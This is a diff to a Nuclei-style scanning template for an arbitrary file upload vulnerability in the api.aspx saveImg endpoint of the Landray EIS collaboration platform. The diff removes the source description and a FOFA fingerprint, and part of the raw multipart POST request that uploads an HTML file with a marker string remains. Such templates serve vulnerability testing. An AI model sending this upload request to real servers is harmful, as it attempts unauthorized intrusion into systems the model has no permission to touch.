@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台api.aspx接口任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tfskpq0z9k967edo'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tfskpq0z9k967edo
-    fofa: icon_hash="953405444"
 http:
 - raw:
   - 'POST /eis/service/api.aspx?action=saveImg HTTP/1.1
@@ -29,8 +25,6 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu
 
 
-
-
     ------WebKitFormBoundaryxdgaqmqu
 
 
@@ -38,8 +32,6 @@ http:
 
 
     Content-Type: text/html
-
-
 
 
     dudesuite
